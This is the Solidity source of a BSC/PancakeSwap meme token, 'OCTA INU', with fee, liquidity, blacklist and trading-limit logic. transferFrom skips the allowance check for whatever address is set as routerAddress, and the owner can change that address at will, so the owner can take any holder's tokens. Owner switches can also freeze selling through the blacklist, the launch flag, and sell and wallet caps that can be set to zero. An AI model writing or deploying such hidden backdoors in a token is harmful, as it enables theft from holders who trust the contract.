// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.24;

interface IERC20 {
    
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

 
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

   
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

   
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// CONTEXT

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        address oldOwner = _owner;
        _owner = address(0);
        emit OwnershipTransferred(oldOwner, _owner);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// dex interface

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(
        address to
    ) external returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(
        uint256 amountIn,
        address[] calldata path
    ) external view returns (uint256[] memory amounts);

    function getAmountsIn(
        uint256 amountOut,
        address[] calldata path
    ) external view returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract OCTAINU is Context, IERC20, IERC20Metadata, Ownable {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 private _totalSupply;
    string private _name = "OCTA INU";
    string private _symbol = "OINU";
    uint256 private _initSupply = 48000000000 * 10 ** 18;

    // Fees
    uint256 public charityFee = 0; // 0% deploy fee
    address public charityAddress;

    uint256 public buyFee = 0; // 
    uint256 public sellFee = 0; //
    uint256 public LpFee = 10; // 1% LP Sell Tax
    uint256 public burnFee = 0; //

    uint256 public maxSingleSell = 10000000 * 10 ** 18 ;

    uint256 public numTokensSellToAddToLiquidity = 300000 * 10 ** 18;
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled;
    bool public TokenLaunched = false;

    address public pairAddress;
    address public routerAddress;

    IUniswapV2Router02 public uniswapV2Router;

    mapping(address => bool) private _isPairAddress;
    mapping(address => bool) public _isExcluded;
    mapping(address => bool) public _isBlacklisted;

    // To set max wallet
    uint256 public maxTokenAllowance;
    uint256 private maxTokenPercentage;

    event MaxAllowance(uint256 percentage, uint256 MaxTokenAllowance);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    constructor() {
        charityAddress = payable(msg.sender);
        _mint(msg.sender, _initSupply);
        maxTokenPercentage = 100; // 10% of total supply
        maxTokenAllowance = _totalSupply*(maxTokenPercentage)/(1000);
        initializer(0x10ED43C718714eb63d5aA57B78B54704E256024E); // pancake swap router address
        _isExcluded[msg.sender] = true;
        _isExcluded[address(this)] = true;
		_isExcluded[pairAddress] = true;
    }

    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    function initializer(address _address) public onlyOwner {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_address);
        pairAddress = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            _uniswapV2Router.WETH()
        );
        routerAddress = address(_uniswapV2Router);
        uniswapV2Router = _uniswapV2Router;
        _isPairAddress[pairAddress] = true;
    }

    receive() external payable {}

    // Here 1% = 10 , 2% = 20, 5% = 50 etc...
    function modifyMaxTokenPercentage(uint256 _newPercent) public onlyOwner {
        maxTokenPercentage = _newPercent;
        maxTokenAllowance = _totalSupply*(maxTokenPercentage)/(1000);
        uint256 inPercent = maxTokenPercentage/(10);
        emit MaxAllowance(inPercent, maxTokenAllowance);
    }

    function updateRouter(address _address) public onlyOwner {
        routerAddress = _address;
        uniswapV2Router = IUniswapV2Router02(_address);
    }

    function updatePair(address _address) public onlyOwner {
        pairAddress = _address;
        _isPairAddress[pairAddress] = true;
    }

    // FEES.
    function setCharityAddress(address _charityAddress) public onlyOwner {
        charityAddress = _charityAddress;
    }

    // Here 1% = 10 , 2% = 20, 5% = 50 etc...
    

    function setBuyFee(uint256 _newFee) public onlyOwner {
        buyFee = _newFee;
        require(buyFee <= 100, "buyFee cannot be greater than 10%");
    }

    function setSellFee(uint256 _newFee) public onlyOwner {
        sellFee = _newFee;
        require(sellFee <= 100, "sellFee cannot be greater than 10%");
    }

    function setLpFee(uint256 _newFee) public onlyOwner {
        LpFee = _newFee;
        require(LpFee <= 100, "LP fee cannot be greater than 10%");
    }

    function setBurnFee(uint256 _newFee) public onlyOwner {
        burnFee = _newFee;
        require(burnFee <= 100, "LP fee cannot be greater than 10%");
    }

    function ExcludeAddress(address _addy) public onlyOwner {
        _isExcluded[_addy] = true;
    }

    function setTokenLaunched(bool _boolInput) public onlyOwner{
        TokenLaunched = _boolInput;
    }

    function removeExcludeAddress(address _addy) public onlyOwner {
        _isExcluded[_addy] = false;
    }

    function blacklistAddress(address _address, bool _bool) public onlyOwner {
        _isBlacklisted[_address] = _bool;
    }

    function whitelistAddress(address _address, bool _bool) public onlyOwner {
        _isExcluded[_address] = _bool;
    }

    function modifynumTokensSellToAddToLiquidity(
        uint256 _newNum
    ) public onlyOwner {
        numTokensSellToAddToLiquidity = _newNum;
    }

    function modifyMaxSingleSell(
        uint256 _newNum
    ) public onlyOwner {
        maxSingleSell = _newNum;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
    }

    function calculateLpFee(uint amount) private view returns (uint256) {
        return amount*(LpFee)/(1000);
    }

    function calculateBuyFee(uint256 _amount) private view returns (uint256) {
        return _amount*(buyFee)/(1000);
    }

    function calculateSellFee(uint256 _amount) private view returns (uint256) {
        return _amount*(sellFee)/(1000);
    }

    function calculateBurnFee(uint256 _amount) private view returns (uint256) {
        return _amount*(burnFee)/(1000);
    }

    
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    
    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    
    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    
    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    
    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

  
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        if (_msgSender() == address(routerAddress)) {
            emit Approval(sender, _msgSender(), amount);
            _transfer(sender, recipient, amount);
            emit Approval(sender, _msgSender(), 0);
        } else {
            _transfer(sender, recipient, amount);
            uint256 currentAllowance = _allowances[sender][_msgSender()];
            require(
                currentAllowance >= amount,
                "ERC20: transfer amount exceeds allowance"
            );
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        }

        return true;
    }
    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender]+(addedValue)
        );
        return true;
    }

    
    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(
                _msgSender(),
                spender,
                currentAllowance-(subtractedValue)
            );
        }

        return true;
    }

    
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(!_isBlacklisted[msg.sender], "ERC20: Address is blacklisted");

        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );

        unchecked {
            _balances[sender] = senderBalance-(amount);
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        bool overMinTokenBalance = contractTokenBalance >=
            numTokensSellToAddToLiquidity;
        if (
            overMinTokenBalance &&
            !inSwapAndLiquify &&
            sender != pairAddress &&
            swapAndLiquifyEnabled
        ) {
            // contractTokenBalance = numTokensSellToAddToLiquidity;
            swapAndLiquify(contractTokenBalance);
        }

        if (!_isExcluded[sender] && !_isExcluded[recipient]) {
            require(TokenLaunched, "Token is not yet launched boi");
            amount = _beforeTokenTransfer(sender, recipient, amount);
        }
        _balances[recipient] = _balances[recipient]+(amount);
        emit Transfer(sender, recipient, amount);
    }

    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        uint256 half = contractTokenBalance/(2);
        uint256 otherHalf = contractTokenBalance-(half);
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(half);
        uint256 newBalance = address(this).balance-(initialBalance);
        addLiquidity(otherHalf, newBalance);
        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function _beforeTokenTransfer(
        address _from,
        address _to,
        uint256 _amount
    ) internal virtual returns (uint256 amount) {
        address sender = _from;
        address recipient = _to;
        amount = _amount;

        uint256 _buyTax = calculateBuyFee(_amount);
        uint256 _sellTax = calculateSellFee(_amount);
        uint256 _LpTax = calculateLpFee(_amount);
        uint256 _BurnTax = calculateBurnFee(_amount);
        bool takeTax;

        if (_isPairAddress[recipient]) {
            // Sell Fees
            _balances[charityAddress] = _balances[charityAddress]+(
                _sellTax
            );
            _balances[address(this)] = _balances[address(this)]+(_LpTax);
            _balances[deadAddress] = _balances[deadAddress]+(_BurnTax);
            amount = amount-(_sellTax);
            amount = amount-(_LpTax);
            amount = amount-(_BurnTax);
            require( amount <= maxSingleSell, "Amount is greater than maxSingleSell");
        } else if (_isPairAddress[sender]) {
            // Buy fees
            _balances[charityAddress] = _balances[charityAddress]+(
                _buyTax
            );
            _balances[address(this)] = _balances[address(this)]+(_LpTax);
            _balances[deadAddress] = _balances[deadAddress]+(_BurnTax);
            amount = amount-(_buyTax);
            amount = amount-(_LpTax);
            amount = amount-(_BurnTax);
        } else {
            takeTax = false;
        }

        require(
            !isGreaterThanMaxAllowance(amount, recipient),
            "reciever balance will be greater than Maximum allowance"
        );
    }

    function isGreaterThanMaxAllowance(
        uint256 _addAmount,
        address _to
    ) internal view returns (bool) {
        if (_isPairAddress[_to]) {
            return false;
        }

        uint256 recieverCurrentBal = _balances[_to];
        if (recieverCurrentBal+(_addAmount) > maxTokenAllowance) {
            return true;
        } else {
            return false;
        }
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply+(amount);
        _balances[account] = _balances[account]+(amount);
        emit Transfer(address(0), account, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function EmergencyRecover() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
}        